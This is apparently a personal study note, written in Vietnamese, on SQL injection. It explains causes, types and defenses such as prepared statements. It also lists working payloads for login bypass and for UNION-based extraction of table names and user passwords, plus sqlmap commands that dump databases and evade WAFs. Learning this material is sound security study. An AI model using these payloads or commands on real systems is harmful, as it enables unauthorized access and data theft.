# SQL Injection (SQLi)

> **Status:** 🔴 todo  
> **Tags:** #web #sqli #injection  
> **Nguồn:** PortSwigger Web Academy + HTB Academy  
> **Domino:** `OWASP Top 10` → **`SQL Injection`** → `XSS`

---

## CHIA — Câu hỏi cần trả lời

- Tại sao SQLi xảy ra? Điều kiện nào cần có?
- Phân biệt các loại SQLi: in-band, blind, out-of-band?
- Detect và exploit bằng tool gì? Manual ra sao?

---

## CHỌN — 20/80 cần nhớ

SQLi = app **nhúng thẳng user input vào SQL query** mà không sanitize.  
Dấu hiệu: `'` (single quote) gây error = có thể SQLi.  
Payload đơn giản nhất: `' OR '1'='1` → bypass login.  
Tool: **sqlmap** (tự động), **Burp Suite** (manual intercept).  
Phòng thủ: **Prepared Statements / Parameterized Queries** — không gì khác đủ.

---

## CHUỖI — Chi tiết + Thực hành

### Tại sao SQLi xảy ra?

```sql
-- Code lỗi (vulnerable):
query = "SELECT * FROM users WHERE username = '" + userInput + "'"

-- Nếu userInput = admin' OR '1'='1
-- Query trở thành:
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
-- '1'='1' luôn đúng → trả về tất cả users
```

### Các loại SQLi

| Loại | Đặc điểm | Cách detect |
|------|----------|-------------|
| **In-band (Error-based)** | Lỗi SQL hiện ra trực tiếp | Thêm `'`, xem error message |
| **In-band (Union-based)** | Dùng UNION để lấy data từ table khác | `' UNION SELECT 1,2,3--` |
| **Blind (Boolean)** | Không có error, nhưng app respond khác nhau | `' AND 1=1--` vs `' AND 1=2--` |
| **Blind (Time-based)** | Dùng delay để suy ra kết quả | `' AND SLEEP(5)--` |
| **Out-of-band** | Dữ liệu trả về qua DNS/HTTP khác | Hiếm gặp, cần điều kiện đặc biệt |

### Payload thực hành

```sql
-- Kiểm tra có SQLi không
'
''
' OR '1'='1
' OR 1=1--
' OR 1=1#

-- Xác định số cột (Union-based)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    ← nếu error ở đây = có 2 cột

-- UNION attack - lấy database name
' UNION SELECT null, database()--

-- UNION attack - liệt kê tables
' UNION SELECT null, table_name FROM information_schema.tables--

-- UNION attack - lấy columns của table
' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--

-- UNION attack - lấy data
' UNION SELECT username, password FROM users--

-- Time-based blind (MySQL)
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
```

### Dùng sqlmap

```bash
# Scan cơ bản
sqlmap -u "http://target.com/item?id=1"

# Với POST request (từ Burp)
sqlmap -r request.txt

# Lấy tên databases
sqlmap -u "http://target.com/item?id=1" --dbs

# Lấy tables của database
sqlmap -u "http://target.com/item?id=1" -D dbname --tables

# Dump data
sqlmap -u "http://target.com/item?id=1" -D dbname -T users --dump

# Tùy chọn bypass WAF
sqlmap -u "..." --tamper=space2comment,randomcase
```

---

## Associate — Liên kết với thứ đã biết

- **SQLi** → giống command injection nhưng target là SQL engine thay vì OS shell
- **Prepared statements** = tách query và data → SQL engine không thể nhầm data là code
- Sau khi SQLi thành công → có thể có **RCE** nếu MySQL + FILE privilege hoặc MSSQL + `xp_cmdshell`
- **Phòng thủ:** prepared statements > stored procedures > ORM > input validation (tầng cuối cùng)

---

## Nhớ nhanh — 1 câu

> SQLi = app trộn code và data vào cùng 1 chỗ; attacker inject thêm code vào data → DB thực thi ý muốn của attacker.

---

## Xem thêm

- [ ] [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection) ← làm hết labs này
- [ ] [sqlmap documentation](https://sqlmap.org)
- [ ] [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
